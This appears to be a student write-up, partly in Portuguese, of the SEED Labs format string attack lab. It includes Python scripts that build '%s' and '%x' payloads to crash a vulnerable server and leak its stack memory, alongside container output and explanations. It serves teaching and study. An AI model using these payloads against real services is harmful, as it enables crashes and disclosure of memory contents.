# SEED Labs - Format String Attack Lab

## Task 1: Crashing the Program

- build_string.py
```python
#!/usr/bin/python3
import sys

N = 1500
content = ("%s"*N).encode('latin-1')

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

Uma vez que, a função `printf` é chamada (na `myprintf`) sem nenhum argumento opcional, caso o input (string) seja vários `format specifiers`, o seu pointer `va_list` irá avançar para endereços além da sua stack frame. O payload, guardado em `build_string.py`, foi preenchido com vários `%s` como se pode ver acima.
Para cada format specifier `%s` a função `printf` irá tratar o valor obtido (para onde va_list aponta) como um endereço e tenta imprimir valor desse mesmo endereço. O programa irá terminar indevidamente quando a função `printf` tentar imprimir o valor de um endereço inválido (null pointers, endereços que apontam para memória protegida ou endereços virtuais que não estão mapeados na memória física).

- Printout do container:
```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd740
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd668
server-10.9.0.5 | The target variable's value (before): 0x11223344
```

Não é imprimida nenhuma mensagem de retorno, pelo que presupomos que o programa terminou sem retornar devidamente.

## Task 2: Printing Out the Server Program’s Memory

### Task 2.A: Stack Data

Foram necessários **64** (NUM_FORMAT_SPECIFIERS) `format specifiers %x` para `0xaaaaaaaa` ser impresso. `0xaaaaaaaa` (4 bytes) foi colocado no início do payload.

- build_string.py
```python
#!/usr/bin/python3
import sys

NUM_FORMAT_SPECIFIERS = 64

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0xaaaaaaaa
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%x\n"*NUM_FORMAT_SPECIFIERS

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

- Printout do container:
```
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd750
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd678
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | ����11223344
server-10.9.0.5 | 1000
server-10.9.0.5 | 8049db5
(60 linhas ocultas)
server-10.9.0.5 | aaaaaaaa
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

### Task 2.B: Heap Data

# CTF
